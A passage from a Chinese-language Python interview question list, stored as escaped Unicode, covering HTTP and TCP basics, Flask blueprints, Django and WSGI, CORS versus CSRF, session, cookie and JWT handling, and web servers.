start_response)`\u65b9\u6cd5\u7684\u67d0\u4e2a\u5b9e\u4f8b\u3002\u8fd9\u4e2a\u5b9e\u4f8b\u518d\u8c03\u7528`start_response`\u8fd4\u56de\u7ed9\u5b9e\u73b0\u4e86WSGI\u7684\u4e2d\u95f4\u4ef6\uff0c\u518d\u7531\u4e2d\u95f4\u4ef6\u8fd4\u56de\u7ed9Nginx\u3002\n### 126.\u63cf\u8ff0\u7528\u6d4f\u89c8\u5668\u8bbf\u95eewww.baidu.com\u7684\u8fc7\u7a0b\n### 127.Post\u548cGet\u8bf7\u6c42\u7684\u533a\u522b?\n### 128.cookie \u548csession \u7684\u533a\u522b\uff1f\n### 129.\u5217\u51fa\u4f60\u77e5\u9053\u7684HTTP\u534f\u8bae\u7684\u72b6\u6001\u7801\uff0c\u8bf4\u51fa\u8868\u793a\u4ec0\u4e48\u610f\u601d\uff1f\n### 130.\u8bf7\u7b80\u5355\u8bf4\u4e00\u4e0b\u4e09\u6b21\u63e1\u624b\u548c\u56db\u6b21\u6325\u624b\uff1f\n### 131.\u8bf4\u4e00\u4e0b\u4ec0\u4e48\u662ftcp\u76842MSL\uff1f\n### 132.\u4e3a\u4ec0\u4e48\u5ba2\u6237\u7aef\u5728TIME-WAIT\u72b6\u6001\u5fc5\u987b\u7b49\u5f852MSL\u7684\u65f6\u95f4\uff1f\n### 133.\u8bf4\u8bf4HTTP\u548cHTTPS\u533a\u522b\uff1f\n### 134.\u8c08\u4e00\u4e0bHTTP\u534f\u8bae\u4ee5\u53ca\u534f\u8bae\u5934\u90e8\u4e2d\u8868\u793a\u6570\u636e\u7c7b\u578b\u7684\u5b57\u6bb5\uff1f\n### 135.HTTP\u8bf7\u6c42\u65b9\u6cd5\u90fd\u6709\u4ec0\u4e48\uff1f\n### 136.\u4f7f\u7528Socket\u5957\u63a5\u5b57\u9700\u8981\u4f20\u5165\u54ea\u4e9b\u53c2\u6570 \uff1f\n### 137.HTTP\u5e38\u89c1\u8bf7\u6c42\u5934\uff1f\n### 138.\u4e03\u5c42\u6a21\u578b\uff1f\n### 139.url\u7684\u5f62\u5f0f\uff1f\n\n# Web\n## Flask\n### 140.\u5bf9Flask\u84dd\u56fe(Blueprint)\u7684\u7406\u89e3\uff1f\n\u84dd\u56fe\u7684\u5b9a\u4e49\n\n\u84dd\u56fe \/Blueprint \u662fFlask\u5e94\u7528\u7a0b\u5e8f\u7ec4\u4ef6\u5316\u7684\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5728\u4e00\u4e2a\u5e94\u7528\u5185\u6216\u8de8\u8d8a\u591a\u4e2a\u9879\u76ee\u5171\u7528\u84dd\u56fe\u3002\u4f7f\u7528\u84dd\u56fe\u53ef\u4ee5\u6781\u5927\u7b80\u5316\u5927\u578b\u5e94\u7528\u7684\u5f00\u53d1\u96be\u5ea6\uff0c\u4e5f\u4e3aFlask\u6269\u5c55\u63d0\u4f9b\u4e86\u4e00\u79cd\u5728\u5e94\u7528\u4e2d\u6ce8\u518c\u670d\u52a1\u7684\u96c6\u4e2d\u5f0f\u673a\u5236\u3002\n\n\u84dd\u56fe\u7684\u5e94\u7528\u573a\u666f\uff1a\n\n\u628a\u4e00\u4e2a\u5e94\u7528\u5206\u89e3\u4e3a\u4e00\u4e2a\u84dd\u56fe\u7684\u96c6\u5408\u3002\u8fd9\u5bf9\u5927\u578b\u5e94\u7528\u662f\u7406\u60f3\u7684\u3002\u4e00\u4e2a\u9879\u76ee\u53ef\u4ee5\u5b9e\u4f8b\u5316\u4e00\u4e2a\u5e94\u7528\u5bf9\u8c61\uff0c\u521d\u59cb\u5316\u51e0\u4e2a\u6269\u5c55\uff0c\u5e76\u6ce8\u518c\u4e00\u96c6\u5408\u7684\u84dd\u56fe\u3002\n\n\u4ee5URL\u524d\u7f00\u548c\/\u6216\u5b50\u57df\u540d\uff0c\u5728\u5e94\u7528\u4e0a\u6ce8\u518c\u4e00\u4e2a\u84dd\u56fe\u3002URL\u524d\u7f00\/\u5b50\u57df\u540d\u4e2d\u7684\u53c2\u6570\u5373\u6210\u4e3a\u8fd9\u4e2a\u84dd\u56fe\u4e0b\u7684\u6240\u6709\u89c6\u56fe\u51fd\u6570\u7684\u5171\u540c\u7684\u89c6\u56fe\u53c2\u6570\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff09\n\u5728\u4e00\u4e2a\u5e94\u7528\u4e2d\u7528\u4e0d\u540c\u7684URL\u89c4\u5219\u591a\u6b21\u6ce8\u518c\u4e00\u4e2a\u84dd\u56fe\u3002\n\n\u901a\u8fc7\u84dd\u56fe\u63d0\u4f9b\u6a21\u677f\u8fc7\u6ee4\u5668\u3001\u9759\u6001\u6587\u4ef6\u3001\u6a21\u677f\u548c\u5176\u4ed6\u529f\u80fd\u3002\u4e00\u4e2a\u84dd\u56fe\u4e0d\u4e00\u5b9a\u8981\u5b9e\u73b0\u5e94\u7528\u6216\u89c6\u56fe\u51fd\u6570\u3002\n\n\u521d\u59cb\u5316\u4e00\u4e2aFlask\u6269\u5c55\u65f6\uff0c\u5728\u8fd9\u4e9b\u60c5\u51b5\u4e2d\u6ce8\u518c\u4e00\u4e2a\u84dd\u56fe\u3002\n\n\u84dd\u56fe\u7684\u7f3a\u70b9\uff1a\n\n\u4e0d\u80fd\u5728\u5e94\u7528\u521b\u5efa\u540e\u64a4\u9500\u6ce8\u518c\u4e00\u4e2a\u84dd\u56fe\u800c\u4e0d\u9500\u6bc1\u6574\u4e2a\u5e94\u7528\u5bf9\u8c61\u3002\n\n\u4f7f\u7528\u84dd\u56fe\u7684\u4e09\u4e2a\u6b65\u9aa4\n\n1.\u521b\u5efa\u4e00\u4e2a\u84dd\u56fe\u5bf9\u8c61\n```python\nblue = Blueprint(\"blue\",__name__)\n```\n2.\u5728\u8fd9\u4e2a\u84dd\u56fe\u5bf9\u8c61\u4e0a\u8fdb\u884c\u64cd\u4f5c\uff0c\u4f8b\u5982\u6ce8\u518c\u8def\u7531\u3001\u6307\u5b9a\u9759\u6001\u6587\u4ef6\u5939\u3001\u6ce8\u518c\u6a21\u677f\u8fc7\u6ee4\u5668...\n```python\n@blue.route('\/')\ndef blue_index():\n    return \"Welcome to my blueprint\"\n```\n3.\u5728\u5e94\u7528\u5bf9\u8c61\u4e0a\u6ce8\u518c\u8fd9\u4e2a\u84dd\u56fe\u5bf9\u8c61\n```python\napp.register_blueprint(blue,url_prefix=\"\/blue\")\n```\n\n### 141.Flask \u548c Django \u8def\u7531\u6620\u5c04\u7684\u533a\u522b\uff1f\n  \u5728django\u4e2d\uff0c\u8def\u7531\u662f\u6d4f\u89c8\u5668\u8bbf\u95ee\u670d\u52a1\u5668\u65f6\uff0c\u5148\u8bbf\u95ee\u7684\u9879\u76ee\u4e2d\u7684url\uff0c\u518d\u7531\u9879\u76ee\u4e2d\u7684url\u627e\u5230\u5e94\u7528\u4e2durl\uff0c\u8fd9\u4e9burl\u662f\u653e\u5728\u4e00\u4e2a\u5217\u8868\u91cc\uff0c\u9075\u4ece\u4ece\u524d\u5f80\u540e\u5339\u914d\u7684\u89c4\u5219\u3002\u5728flask\u4e2d\uff0c\u8def\u7531\u662f\u901a\u8fc7\u88c5\u9970\u5668\u7ed9\u6bcf\u4e2a\u89c6\u56fe\u51fd\u6570\u63d0\u4f9b\u7684\uff0c\u800c\u4e14\u6839\u636e\u8bf7\u6c42\u65b9\u5f0f\u7684\u4e0d\u540c\u53ef\u4ee5\u4e00\u4e2aurl\u7528\u4e8e\u4e0d\u540c\u7684\u4f5c\u7528\u3002\n\n## Django\n### 142.\u4ec0\u4e48\u662fwsgi,uwsgi,uWSGI?\nWSGI:\n\nweb\u670d\u52a1\u5668\u7f51\u5173\u63a5\u53e3\uff0c\u662f\u4e00\u5957\u534f\u8bae\u3002\u7528\u4e8e\u63a5\u6536\u7528\u6237\u8bf7\u6c42\u5e76\u5c06\u8bf7\u6c42\u8fdb\u884c\u521d\u6b21\u5c01\u88c5\uff0c\u7136\u540e\u5c06\u8bf7\u6c42\u4ea4\u7ed9web\u6846\u67b6\u3002\n\n\u5b9e\u73b0wsgi\u534f\u8bae\u7684\u6a21\u5757\uff1awsgiref,\u672c\u8d28\u4e0a\u5c31\u662f\u7f16\u5199\u4e00socket\u670d\u52a1\u7aef\uff0c\u7528\u4e8e\u63a5\u6536\u7528\u6237\u8bf7\u6c42\uff08django)\n\nwerkzeug,\u672c\u8d28\u4e0a\u5c31\u662f\u7f16\u5199\u4e00\u4e2asocket\u670d\u52a1\u7aef\uff0c\u7528\u4e8e\u63a5\u6536\u7528\u6237\u8bf7\u6c42(flask)\n\nuwsgi:\n\n\u4e0eWSGI\u4e00\u6837\u662f\u4e00\u79cd\u901a\u4fe1\u534f\u8bae\uff0c\u5b83\u662fuWSGI\u670d\u52a1\u5668\u7684\u72ec\u5360\u534f\u8bae\uff0c\u7528\u4e8e\u5b9a\u4e49\u4f20\u8f93\u4fe1\u606f\u7684\u7c7b\u578b\u3002\nuWSGI:\n\n\u662f\u4e00\u4e2aweb\u670d\u52a1\u5668\uff0c\u5b9e\u73b0\u4e86WSGI\u7684\u534f\u8bae\uff0cuWSGI\u534f\u8bae\uff0chttp\u534f\u8bae\n\n### 143.Django\u3001Flask\u3001Tornado\u7684\u5bf9\u6bd4\uff1f\n1\u3001 Django\u8d70\u7684\u5927\u800c\u5168\u7684\u65b9\u5411\uff0c\u5f00\u53d1\u6548\u7387\u9ad8\u3002\u5b83\u7684MTV\u6846\u67b6\uff0c\u81ea\u5e26\u7684ORM,admin\u540e\u53f0\u7ba1\u7406,\u81ea\u5e26\u7684sqlite\u6570\u636e\u5e93\u548c\u5f00\u53d1\u6d4b\u8bd5\u7528\u7684\u670d\u52a1\u5668\uff0c\u7ed9\u5f00\u53d1\u8005\u63d0\u9ad8\u4e86\u8d85\u9ad8\u7684\u5f00\u53d1\u6548\u7387\u3002\n\u91cd\u91cf\u7ea7web\u6846\u67b6\uff0c\u529f\u80fd\u9f50\u5168\uff0c\u63d0\u4f9b\u4e00\u7ad9\u5f0f\u89e3\u51b3\u7684\u601d\u8def\uff0c\u80fd\u8ba9\u5f00\u53d1\u8005\u4e0d\u7528\u5728\u9009\u62e9\u4e0a\u82b1\u8d39\u5927\u91cf\u65f6\u95f4\u3002\n\n\u81ea\u5e26ORM\u548c\u6a21\u677f\u5f15\u64ce\uff0c\u652f\u6301jinja\u7b49\u975e\u5b98\u65b9\u6a21\u677f\u5f15\u64ce\u3002\n\n\u81ea\u5e26ORM\u4f7fDjango\u548c\u5173\u7cfb\u578b\u6570\u636e\u5e93\u8026\u5408\u5ea6\u9ad8\uff0c\u5982\u679c\u8981\u4f7f\u7528\u975e\u5173\u7cfb\u578b\u6570\u636e\u5e93\uff0c\u9700\u8981\u4f7f\u7528\u7b2c\u4e09\u65b9\u5e93\n\n\u81ea\u5e26\u6570\u636e\u5e93\u7ba1\u7406app\n\n\u6210\u719f\uff0c\u7a33\u5b9a\uff0c\u5f00\u53d1\u6548\u7387\u9ad8\uff0c\u76f8\u5bf9\u4e8eFlask\uff0cDjango\u7684\u6574\u4f53\u5c01\u95ed\u6027\u6bd4\u8f83\u597d\uff0c\u9002\u5408\u505a\u4f01\u4e1a\u7ea7\u7f51\u7ad9\u7684\u5f00\u53d1\u3002python web\u6846\u67b6\u7684\u5148\u9a71\uff0c\u7b2c\u4e09\u65b9\u5e93\u4e30\u5bcc\n\n2\u3001 Flask \u662f\u8f7b\u91cf\u7ea7\u7684\u6846\u67b6\uff0c\u81ea\u7531\uff0c\u7075\u6d3b\uff0c\u53ef\u6269\u5c55\u6027\u5f3a\uff0c\u6838\u5fc3\u57fa\u4e8eWerkzeug WSGI\u5de5\u5177 \u548cjinja2 \u6a21\u677f\u5f15\u64ce\n\n\u9002\u7528\u4e8e\u505a\u5c0f\u7f51\u7ad9\u4ee5\u53caweb\u670d\u52a1\u7684API,\u5f00\u53d1\u5927\u578b\u7f51\u7ad9\u65e0\u538b\u529b\uff0c\u4f46\u67b6\u6784\u9700\u8981\u81ea\u5df1\u8bbe\u8ba1\n\n\u4e0e\u5173\u7cfb\u578b\u6570\u636e\u5e93\u7684\u7ed3\u5408\u4e0d\u5f31\u4e8eDjango\uff0c\u800c\u4e0e\u975e\u5173\u7cfb\u578b\u6570\u636e\u5e93\u7684\u7ed3\u5408\u8fdc\u8fdc\u4f18\u4e8eDjango\n\n3\u3001 Tornado\u8d70\u7684\u662f\u5c11\u800c\u7cbe\u7684\u65b9\u5411\uff0c\u6027\u80fd\u4f18\u8d8a\uff0c\u5b83\u6700\u51fa\u540d\u7684\u5f02\u6b65\u975e\u963b\u585e\u7684\u8bbe\u8ba1\u65b9\u5f0f\n\nTornado\u7684\u4e24\u5927\u6838\u5fc3\u6a21\u5757\uff1a\n\niostraem:\u5bf9\u975e\u963b\u585e\u7684socket\u8fdb\u884c\u7b80\u5355\u7684\u5c01\u88c5\n\nioloop: \u5bf9I\/O \u591a\u8def\u590d\u7528\u7684\u5c01\u88c5,\u5b83\u5b9e\u73b0\u4e00\u4e2a\u5355\u4f8b\n\n### 144.CORS \u548c CSRF\u7684\u533a\u522b\uff1f\n\u4ec0\u4e48\u662fCORS\uff1f\n\nCORS\u662f\u4e00\u4e2aW3C\u6807\u51c6,\u5168\u79f0\u662f\u201c\u8de8\u57df\u8d44\u6e90\u5171\u4eab\"(Cross-origin resoure sharing).\n\u5b83\u5141\u8bb8\u6d4f\u89c8\u5668\u5411\u8de8\u6e90\u670d\u52a1\u5668\uff0c\u53d1\u51faXMLHttpRequest\u8bf7\u6c42\uff0c\u4ece\u800c\u5ba2\u670d\u4e86AJAX\u53ea\u80fd\u540c\u6e90\u4f7f\u7528\u7684\u9650\u5236\u3002\n\n\u4ec0\u4e48\u662fCSRF\uff1f\n\nCSRF\u4e3b\u6d41\u9632\u5fa1\u65b9\u5f0f\u662f\u5728\u540e\u7aef\u751f\u6210\u8868\u5355\u7684\u65f6\u5019\u751f\u6210\u4e00\u4e32\u968f\u673atoken,\u5185\u7f6e\u5230\u8868\u5355\u91cc\u6210\u4e3a\u4e00\u4e2a\u5b57\u6bb5\uff0c\u540c\u65f6\uff0c\u5c06\u6b64\u4e32token\u7f6e\u5165session\u4e2d\u3002\u6bcf\u6b21\u8868\u5355\u63d0\u4ea4\u5230\u540e\u7aef\u65f6\u90fd\u4f1a\u68c0\u67e5\u8fd9\u4e24\u4e2a\u503c\u662f\u5426\u4e00\u81f4\uff0c\u4ee5\u6b64\u6765\u5224\u65ad\u6b64\u6b21\u8868\u5355\u63d0\u4ea4\u662f\u5426\u662f\u53ef\u4fe1\u7684\uff0c\u63d0\u4ea4\u8fc7\u4e00\u6b21\u4e4b\u540e\uff0c\u5982\u679c\u8fd9\u4e2a\u9875\u9762\u6ca1\u6709\u751f\u6210CSRF token,\u90a3\u4e48token\u5c06\u4f1a\u88ab\u6e05\u7a7a,\u5982\u679c\u6709\u65b0\u7684\u9700\u6c42\uff0c\u90a3\u4e48token\u4f1a\u88ab\u66f4\u65b0\u3002\n\u653b\u51fb\u8005\u53ef\u4ee5\u4f2a\u9020POST\u8868\u5355\u63d0\u4ea4\uff0c\u4f46\u662f\u4ed6\u6ca1\u6709\u540e\u7aef\u751f\u6210\u7684\u5185\u7f6e\u4e8e\u8868\u5355\u7684token\uff0csession\u4e2d\u6ca1\u6709token\u90fd\u65e0\u6d4e\u4e8e\u4e8b\u3002\n\n### 145.Session,Cookie,JWT\u7684\u7406\u89e3\n\u4e3a\u4ec0\u4e48\u8981\u4f7f\u7528\u4f1a\u8bdd\u7ba1\u7406\n\n\u4f17\u6240\u5468\u77e5\uff0cHTTP\u534f\u8bae\u662f\u4e00\u4e2a\u65e0\u72b6\u6001\u7684\u534f\u8bae\uff0c\u4e5f\u5c31\u662f\u8bf4\u6bcf\u4e2a\u8bf7\u6c42\u90fd\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u8bf7\u6c42\uff0c\u8bf7\u6c42\u4e0e\u8bf7\u6c42\u4e4b\u95f4\u5e76\u65e0\u5173\u7cfb\u3002\u4f46\u5728\u5b9e\u9645\u7684\u5e94\u7528\u573a\u666f\uff0c\u8fd9\u79cd\u65b9\u5f0f\u5e76\u4e0d\u80fd\u6ee1\u8db3\u6211\u4eec\u7684\u9700\u6c42\u3002\u4e3e\u4e2a\u5927\u5bb6\u90fd\u559c\u6b22\u7528\u7684\u4f8b\u5b50\uff0c\u628a\u5546\u54c1\u52a0\u5165\u8d2d\u7269\u8f66\uff0c\u5355\u72ec\u8003\u8651\u8fd9\u4e2a\u8bf7\u6c42\uff0c\u670d\u52a1\u7aef\u5e76\u4e0d\u77e5\u9053\u8fd9\u4e2a\u5546\u54c1\u662f\u8c01\u7684\uff0c\u5e94\u8be5\u52a0\u5165\u8c01\u7684\u8d2d\u7269\u8f66\uff1f\u56e0\u6b64\u8fd9\u4e2a\u8bf7\u6c42\u7684\u4e0a\u4e0b\u6587\u73af\u5883\u5b9e\u9645\u4e0a\u5e94\u8be5\u5305\u542b\u7528\u6237\u7684\u76f8\u5173\u4fe1\u606f\uff0c\u5728\u6bcf\u6b21\u7528\u6237\u53d1\u51fa\u8bf7\u6c42\u65f6\u628a\u8fd9\u4e00\u5c0f\u90e8\u5206\u989d\u5916\u4fe1\u606f\uff0c\u4e5f\u505a\u4e3a\u8bf7\u6c42\u7684\u4e00\u90e8\u5206\uff0c\u8fd9\u6837\u670d\u52a1\u7aef\u5c31\u53ef\u4ee5\u6839\u636e\u4e0a\u4e0b\u6587\u4e2d\u7684\u4fe1\u606f\uff0c\u9488\u5bf9\u5177\u4f53\u7684\u7528\u6237\u8fdb\u884c\u64cd\u4f5c\u3002\u6240\u4ee5\u8fd9\u51e0\u79cd\u6280\u672f\u7684\u51fa\u73b0\u90fd\u662f\u5bf9HTTP\u534f\u8bae\u7684\u4e00\u4e2a\u8865\u5145\uff0c\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u7528HTTP\u534f\u8bae+\u72b6\u6001\u7ba1\u7406\u6784\u5efa\u4e00\u4e2a\u7684\u9762\u5411\u7528\u6237\u7684WEB\u5e94\u7528\u3002\n\nSession \u548cCookie\u7684\u533a\u522b\n\n  \u8fd9\u91cc\u6211\u60f3\u5148\u8c08\u8c08session\u4e0ecookies,\u56e0\u4e3a\u8fd9\u4e24\u4e2a\u6280\u672f\u662f\u505a\u4e3a\u5f00\u53d1\u6700\u4e3a\u5e38\u89c1\u7684\u3002\u90a3\u4e48session\u4e0ecookies\u7684\u533a\u522b\u662f\u4ec0\u4e48\uff1f\u4e2a\u4eba\u8ba4\u4e3asession\u4e0ecookies\u6700\u6838\u5fc3\u533a\u522b\u5728\u4e8e\u989d\u5916\u4fe1\u606f\u7531\u8c01\u6765\u7ef4\u62a4\u3002\u5229\u7528cookies\u6765\u5b9e\u73b0\u4f1a\u8bdd\u7ba1\u7406\u65f6\uff0c\u7528\u6237\u7684\u76f8\u5173\u4fe1\u606f\u6216\u8005\u5176\u4ed6\u6211\u4eec\u60f3\u8981\u4fdd\u6301\u5728\u6bcf\u4e2a\u8bf7\u6c42\u4e2d\u7684\u4fe1\u606f\uff0c\u90fd\u662f\u653e\u5728cookies\u4e2d,\u800ccookies\u662f\u7531\u5ba2\u6237\u7aef\u6765\u4fdd\u5b58\uff0c\u6bcf\u5f53\u5ba2\u6237\u7aef\u53d1\u51fa\u65b0\u8bf7\u6c42\u65f6\uff0c\u5c31\u4f1a\u7a0d\u5e26\u4e0acookies,\u670d\u52a1\u7aef\u4f1a\u6839\u636e\u5176\u4e2d\u7684\u4fe1\u606f\u8fdb\u884c\u64cd\u4f5c\u3002\n  \u5f53\u5229\u7528session\u6765\u8fdb\u884c\u4f1a\u8bdd\u7ba1\u7406\u65f6\uff0c\u5ba2\u6237\u7aef\u5b9e\u9645\u4e0a\u53ea\u5b58\u4e86\u4e00\u4e2a\u7531\u670d\u52a1\u7aef\u53d1\u9001\u7684session_id,\u800c\u7531\u8fd9\u4e2asession_id,\u53ef\u4ee5\u5728\u670d\u52a1\u7aef\u8fd8\u539f\u51fa\u6240\u9700\u8981\u7684\u6240\u6709\u72b6\u6001\u4fe1\u606f\uff0c\u4ece\u8fd9\u91cc\u53ef\u4ee5\u770b\u51fa\u8fd9\u90e8\u5206\u4fe1\u606f\u662f\u7531\u670d\u52a1\u7aef\u6765\u7ef4\u62a4\u7684\u3002\n\n\u9664\u6b64\u4ee5\u5916\uff0csession\u4e0ecookies\u90fd\u6709\u4e00\u4e9b\u81ea\u5df1\u7684\u7f3a\u70b9\uff1a\n    \ncookies\u7684\u5b89\u5168\u6027\u4e0d\u597d\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u83b7\u53d6\u672c\u5730cookies\u8fdb\u884c\u6b3a\u9a97\u6216\u8005\u5229\u7528cookies\u8fdb\u884cCSRF\u653b\u51fb\u3002\u4f7f\u7528cookies\u65f6,\u5728\u591a\u4e2a\u57df\u540d\u4e0b\uff0c\u4f1a\u5b58\u5728\u8de8\u57df\u95ee\u9898\u3002\nsession \u5728\u4e00\u5b9a\u7684\u65f6\u95f4\u91cc\uff0c\u9700\u8981\u5b58\u653e\u5728\u670d\u52a1\u7aef\uff0c\u56e0\u6b64\u5f53\u62e5\u6709\u5927\u91cf\u7528\u6237\u65f6\uff0c\u4e5f\u4f1a\u5927\u5e45\u5ea6\u964d\u4f4e\u670d\u52a1\u7aef\u7684\u6027\u80fd\uff0c\u5f53\u6709\u591a\u53f0\u673a\u5668\u65f6\uff0c\u5982\u4f55\u5171\u4eabsession\u4e5f\u4f1a\u662f\u4e00\u4e2a\u95ee\u9898.(redis\u96c6\u7fa4)\u4e5f\u5c31\u662f\u8bf4\uff0c\u7528\u6237\u7b2c\u4e00\u4e2a\u8bbf\u95ee\u7684\u65f6\u5019\u662f\u670d\u52a1\u5668A\uff0c\u800c\u7b2c\u4e8c\u4e2a\u8bf7\u6c42\u88ab\u8f6c\u53d1\u7ed9\u4e86\u670d\u52a1\u5668B\uff0c\u90a3\u670d\u52a1\u5668B\u5982\u4f55\u5f97\u77e5\u5176\u72b6\u6001\u3002\u5b9e\u9645\u4e0a\uff0csession\u4e0ecookies\u662f\u6709\u8054\u7cfb\u7684\uff0c\u6bd4\u5982\u6211\u4eec\u53ef\u4ee5\u628asession_id\u5b58\u653e\u5728cookies\u4e2d\u7684\u3002\n\nJWT\u662f\u5982\u4f55\u5de5\u4f5c\u7684\n\n\u9996\u5148\u7528\u6237\u53d1\u51fa\u767b\u5f55\u8bf7\u6c42\uff0c\u670d\u52a1\u7aef\u6839\u636e\u7528\u6237\u7684\u767b\u5f55\u8bf7\u6c42\u8fdb\u884c\u5339\u914d\uff0c\u5982\u679c\u5339\u914d\u6210\u529f\uff0c\u5c06\u76f8\u5173\u7684\u4fe1\u606f\u653e\u5165payload\u4e2d\uff0c\u5229\u7528\u7b97\u6cd5\uff0c\u52a0\u4e0a\u670d\u52a1\u7aef\u7684\u5bc6\u94a5\u751f\u6210token\uff0c\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662fsecret_key\u5f88\u91cd\u8981\uff0c\u5982\u679c\u8fd9\u4e2a\u6cc4\u9732\u7684\u8bdd\uff0c\u5ba2\u6237\u7aef\u5c31\u53ef\u4ee5\u968f\u673a\u7be1\u6539\u53d1\u9001\u7684\u989d\u5916\u4fe1\u606f\uff0c\u5b83\u662f\u4fe1\u606f\u5b8c\u6574\u6027\u7684\u4fdd\u8bc1\u3002\u751f\u6210token\u540e\u670d\u52a1\u7aef\u5c06\u5176\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\uff0c\u5ba2\u6237\u7aef\u53ef\u4ee5\u5728\u4e0b\u6b21\u8bf7\u6c42\u65f6\uff0c\u5c06token\u4e00\u8d77\u4ea4\u7ed9\u670d\u52a1\u7aef\uff0c\u4e00\u822c\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u653e\u5728Authorization\u9996\u90e8\u4e2d\uff0c\u8fd9\u6837\u4e5f\u5c31\u53ef\u4ee5\u907f\u514d\u8de8\u57df\u95ee\u9898\u3002\n\n### 146.\u7b80\u8ff0Django\u8bf7\u6c42\u751f\u547d\u5468\u671f\n\u4e00\u822c\u662f\u7528\u6237\u901a\u8fc7\u6d4f\u89c8\u5668\u5411\u6211\u4eec\u7684\u670d\u52a1\u5668\u53d1\u8d77\u4e00\u4e2a\u8bf7\u6c42(request),\u8fd9\u4e2a\u8bf7\u6c42\u4f1a\u53bb\u8bbf\u95ee\u89c6\u56fe\u51fd\u6570\uff0c\u5982\u679c\u4e0d\u6d89\u53ca\u5230\u6570\u636e\u8c03\u7528\uff0c\u90a3\u4e48\u8fd9\u4e2a\u65f6\u5019\u89c6\u56fe\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u6a21\u677f\u4e5f\u5c31\u662f\u4e00\u4e2a\u7f51\u9875\u7ed9\u7528\u6237\uff09\n\u89c6\u56fe\u51fd\u6570\u8c03\u7528\u6a21\u578b\u6bdb\u6a21\u578b\u53bb\u6570\u636e\u5e93\u67e5\u627e\u6570\u636e\uff0c\u7136\u540e\u9010\u7ea7\u8fd4\u56de\uff0c\u89c6\u56fe\u51fd\u6570\u628a\u8fd4\u56de\u7684\u6570\u636e\u586b\u5145\u5230\u6a21\u677f\u4e2d\u7a7a\u683c\u4e2d\uff0c\u6700\u540e\u8fd4\u56de\u7f51\u9875\u7ed9\u7528\u6237\u3002\n\n1.wsgi ,\u8bf7\u6c42\u5c01\u88c5\u540e\u4ea4\u7ed9web\u6846\u67b6\uff08Flask\uff0cDjango)\n\n2.\u4e2d\u95f4\u4ef6\uff0c\u5bf9\u8bf7\u6c42\u8fdb\u884c\u6821\u9a8c\u6216\u5728\u8bf7\u6c42\u5bf9\u8c61\u4e2d\u6dfb\u52a0\u5176\u4ed6\u76f8\u5173\u6570\u636e\uff0c\u4f8b\u5982\uff1acsrf,request.session\n\n3.\u8def\u7531\u5339\u914d \u6839\u636e\u6d4f\u89c8\u5668\u53d1\u9001\u7684\u4e0d\u540curl\u53bb\u5339\u914d\u4e0d\u540c\u7684\u89c6\u56fe\u51fd\u6570\n\n4.\u89c6\u56fe\u51fd\u6570\uff0c\u5728\u89c6\u56fe\u51fd\u6570\u4e2d\u8fdb\u884c\u4e1a\u52a1\u903b\u8f91\u7684\u5904\u7406\uff0c\u53ef\u80fd\u6d89\u53ca\u5230\uff1aorm\uff0ctemplates \n\n5.\u4e2d\u95f4\u4ef6\uff0c\u5bf9\u54cd\u5e94\u7684\u6570\u636e\u8fdb\u884c\u5904\u7406\n\n6.wsgi\uff0c\u5c06\u54cd\u5e94\u7684\u5185\u5bb9\u53d1\u9001\u7ed9\u6d4f\u89c8\u5668\n\n### 147.\u7528\u7684restframework\u5b8c\u6210api\u53d1\u9001\u65f6\u95f4\u65f6\u533a\n\u5f53\u524d\u7684\u95ee\u9898\u662f\u7528django\u7684rest framework\u6a21\u5757\u505a\u4e00\u4e2aget\u8bf7\u6c42\u7684\u53d1\u9001\u65f6\u95f4\u4ee5\u53ca\u65f6\u533a\u4fe1\u606f\u7684api\n```python\nclass getCurrenttime(APIView):\n    def get(self,request):\n        local_time = time.localtime()\n        time_zone =settings.TIME_ZONE\n        temp = {'localtime':local_time,'timezone':time_zone}\n        return Response(temp)\n```\n### 148.nginx,tomcat,apach\u5230\u90fd\u662f\u4ec0\u4e48\uff1f\nNginx\uff08engine x)\u662f\u4e00\u4e2a\u9ad8\u6027\u80fd\u7684HTTP\u548c\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u4e5f\u662f \u4e00\u4e2aIMAP\/POP3\/SMTP\u670d\u52a1\u5668\uff0c\u5de5\u4f5c\u5728OSI\u4e03\u5c42\uff0c\u8d1f\u8f7d\u7684\u5b9e\u73b0\u65b9\u5f0f\uff1a\u8f6e\u8be2\uff0cIP_HASH,fair,session_sticky.\nApache HTTP Server\u662f\u4e00\u4e2a\u6a21\u5757\u5316\u7684\u670d\u52a1\u5668\uff0c\u6e90\u4e8eNCSAhttpd\u670d\u52a1\u5668\nTomcat \u670d\u52a1\u5668\u662f\u4e00\u4e2a\u514d\u8d39\u7684\u5f00\u653e\u6e90\u4ee3\u7801\u7684Web\u5e94\u7528\u670d\u52a1\u5668\uff0c\u5c5e\u4e8e\u8f7b\u91cf\u7ea7\u5e94\u7528\u670d\u52a1\u5668\uff0c\u662f\u5f00\u53d1\u548c\u8c03\u8bd5JSP\u7a0b\u5e8f\u7684\u9996\u9009\u3002\n\n### 149.\u8bf7\u7ed9\u51fa\u4f60\u719f\u6089\u5173\u7cfb\u6570\u636e\u5e93\u8303\u5f0f\u6709\u54ea\u4e9b\uff0c\u6709\u4ec0\u4e48\u4f5c\u7528\uff1f\n\u5728\u8fdb\u884c\u6570\u636e\u5e93\u7684\u8bbe\u8ba1\u65f6\uff0c\u6240\u9075\u5faa\u7684\u4e00\u4e9b\u89c4\u8303\uff0c\u53ea\u8981\u6309\u7167\u8bbe\u8ba1\u89c4\u8303\u8fdb\u884c\u8bbe\u8ba1\uff0c\u5c31\u80fd\u8bbe\u8ba1\u51fa\u6ca1\u6709\u6570\u636e\u5197\u4f59\u548c\u6570\u636e\u7ef4\u62a4\u5f02\u5e38\u7684\u6570\u636e\u5e93\u7ed3\u6784\u3002\n\n\u6570\u636e\u5e93\u7684\u8bbe\u8ba1\u7684\u89c4\u8303\u6709\u5f88\u591a\uff0c\u901a\u5e38\u6765\u8bf4\u6211\u4eec\u5728\u8bbe\u662f\u6570\u636e\u5e93\u65f6\u53ea\u8981\u8fbe\u5230\u5176\u4e2d\u4e00\u4e9b